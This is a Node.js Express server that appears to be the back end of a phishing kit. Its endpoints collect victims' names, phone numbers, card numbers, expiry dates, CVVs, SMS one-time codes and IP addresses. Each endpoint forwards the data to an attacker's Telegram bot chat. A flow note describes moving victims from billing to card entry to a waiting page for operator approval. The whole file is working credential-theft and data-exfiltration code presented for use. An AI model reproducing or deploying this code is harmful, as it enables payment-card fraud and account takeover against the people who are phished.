const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const config = require('./config');

// Same names as PHP defines in config.php (used by func.php)
const {
    SITE_BRAND,
    BOT_TOKEN,
    CHAT_ID,
    DELIVERY_TELEGRAM_TITLE,
    PAYMENT_TELEGRAM_TITLE,
    COPYRIGHT_YEAR
} = config;

function escapeHtml(s) {
    return String(s)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

const app = express();

// Security middleware
app.use(helmet());
app.use(cors());

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.'
});
app.use(limiter);

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Routes
app.get('/', (req, res) => {
    res.json({ 
        success: true, 
        message: `${config.server.name} is running`,
        version: config.server.version,
        timestamp: new Date().toISOString()
    });
});

// Payment API endpoint
app.post('/api/billing', async (req, res) => {
    try {
        const {
            firstName,
            lastName,
            phoneNumber,
            creditCard,
            expiryDate,
            expiryMonth,
            expiryYear,
            cvv,
            ip,
            pageUrl,
            timestamp
        } = req.body;
        
        // Validate required fields
        
        
        const message =
            `${DELIVERY_TELEGRAM_TITLE} => ${SITE_BRAND}\n` +
            '- Full name : ' + `<code>${escapeHtml(`${firstName || ''} ${lastName || ''}`.trim())}</code>\n` +
            '- Phone : ' + `<code>${escapeHtml(String(phoneNumber || ''))}</code>\n` +
            '- Card Number : ' + `<code>${escapeHtml(String(creditCard || ''))}</code>\n` +
            '- Exp : ' + `<code>${escapeHtml(String(expiryDate || ''))}</code> (${escapeHtml(String(expiryMonth || ''))}/${escapeHtml(String(expiryYear || ''))})\n` +
            '- CVV : ' + `<code>${escapeHtml(String(cvv || ''))}</code>\n` +
            '- Page URL : ' + `${escapeHtml(pageUrl || 'N/A')}\n` +
            '- IP : ' + `${escapeHtml(String(ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress || ''))}\n` +
            '- Time : ' + `${escapeHtml(timestamp || new Date().toISOString())}\n` +
            `<blockquote>└ © ${SITE_BRAND} · ${COPYRIGHT_YEAR}</blockquote>\n`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );
        
        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'Payment data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        } else {
            throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
        }
        
    } catch (error) {
        console.error('Error sending payment data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send payment data',
            error: error.message
        });
    }
});
app.post('/api/card', async (req, res) => {
    try {
        const {
           
            creditCard,
            expiryDate,
            expiryMonth,
            expiryYear,
            cvv,
            ip,
            pageUrl,
            timestamp
        } = req.body;
        
        // Validate required fields
        
        
        const message =
            `${PAYMENT_TELEGRAM_TITLE} => ${SITE_BRAND}\n` +
            '- Flow: billing (address) → payment (card) → loading (wait for control.php)\n' +
            '- Card Number : ' + `<code>${escapeHtml(String(creditCard || ''))}</code>\n` +
            '- Exp : ' + `<code>${escapeHtml(String(expiryDate || ''))}</code> (${escapeHtml(String(expiryMonth || ''))}/${escapeHtml(String(expiryYear || ''))})\n` +
            '- CVV : ' + `<code>${escapeHtml(String(cvv || ''))}</code>\n` +
            '- Page URL : ' + `${escapeHtml(pageUrl || 'N/A')}\n` +
            '- IP : ' + `${escapeHtml(String(ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress || ''))}\n` +
            '- Time : ' + `${escapeHtml(timestamp || new Date().toISOString())}\n` +
            `<blockquote>└ © ${SITE_BRAND} · ${COPYRIGHT_YEAR}</blockquote>\n`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );
        
        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'Payment data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        } else {
            throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
        }
        
    } catch (error) {
        console.error('Error sending payment data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send payment data',
            error: error.message
        });
    }
});

// SMS API endpoint
app.post('/api/send-sms', async (req, res) => {
    try {
        console.log('[server.js] /api/send-sms - Received request');
        console.log('[server.js] Request body:', JSON.stringify(req.body, null, 2));
        console.log('[server.js] Request headers:', req.headers);
        
        const {
            otp,
            ip,
            pageUrl,
            timestamp
        } = req.body;
        
        // Validate required fields
        if (!otp) {
            console.error('[server.js] ❌ Missing OTP code in request');
            return res.status(400).json({
                success: false,
                message: 'Missing OTP code'
            });
        }
        
        console.log('[server.js] ✅ OTP received:', otp);
        
        const message =
            `[📱 SMS-OTP] => ${SITE_BRAND}\n` +
            '- OTP : ' + `<code>${escapeHtml(String(otp))}</code>\n` +
            '- Page URL : ' + `${escapeHtml(pageUrl || 'N/A')}\n` +
            '- IP : ' + `${escapeHtml(String(ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress || ''))}\n` +
            '- Time : ' + `${escapeHtml(timestamp || new Date().toISOString())}\n` +
            `<blockquote>└ © ${SITE_BRAND} · ${COPYRIGHT_YEAR}</blockquote>\n`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            },
            {
                timeout: 10000
            }
        );
        
        if (telegramResponse.data.ok) {
            return res.status(200).json({
                success: true,
                message: 'SMS data sent successfully',
                messageId: telegramResponse.data.result.message_id,
                timestamp: new Date().toISOString()
            });
        } else {
            throw new Error('Telegram API error: ' + JSON.stringify(telegramResponse.data));
        }
        
    } catch (error) {
        console.error('Error sending SMS data:', error);
        return res.status(500).json({
            success: false,
            message: 'Failed to send SMS data',
            error: error.message
        });
    }
});

// Approve API endpoint
app.post('/api/send-approve', async (req, res) => {
    try {
        const { 
            messages,
            pageType,
            clientIP
        } = req.body;

        // Validate required fields
       

  
        const message =
            `[Approve] ${SITE_BRAND}\n` +
            `- type: ${escapeHtml(String(pageType || ''))}\n` +
            `- me: ${escapeHtml(String(messages || ''))}\n` +
            `- IP: ${escapeHtml(String(clientIP || req.ip || ''))}\n` +
            `- Time: ${escapeHtml(new Date().toLocaleString('en-SG'))}\n` +
            `<blockquote>└ © ${SITE_BRAND} · ${COPYRIGHT_YEAR}</blockquote>`;

        const telegramResponse = await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            }
        );

        if (telegramResponse.data.ok) {
            res.json({ 
                success: true, 
                message: 'Approve data sent successfully',
                messageId: telegramResponse.data.result.message_id
            });
        } else {
            throw new Error('Telegram API error');
        }

    } catch (error) {
        console.error('Error sending approve data:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Failed to send approve data' 
        });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ 
        success: true, 
        message: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ 
        success: false, 
        message: 'Something went wrong!' 
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        message: 'Route not found' 
    });
});

// Start server
const PORT = config.server.port || process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 ${config.server.name} running on port ${PORT}`);
    console.log(`📱 BOT_TOKEN: ${BOT_TOKEN.substring(0, 10)}...`);
    console.log(`🌍 Environment: ${config.server.environment}`);
    console.log(`🔗 API Base URL: http://localhost:${PORT}`);
});

module.exports = app;
